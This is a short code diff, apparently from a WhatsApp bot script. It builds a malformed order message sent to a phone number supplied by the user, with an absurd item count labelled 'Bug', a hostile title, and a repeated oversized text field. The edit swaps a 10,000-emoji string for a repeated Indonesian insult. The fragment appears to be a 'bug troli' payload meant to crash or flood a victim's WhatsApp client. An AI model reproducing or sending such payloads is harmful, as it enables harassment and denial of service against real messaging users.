@@ -12,7 +12,7 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Hai Kak', 'co
     itemCount: 9999999, // Bug
     status: 1,
     surface: 1,
-    message: '🔥'.repeat(10000),
+    message: 'Ajg Lu Dikit2 Troli Asu'.repeat(10),
     orderTitle: 'MAMPUS', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
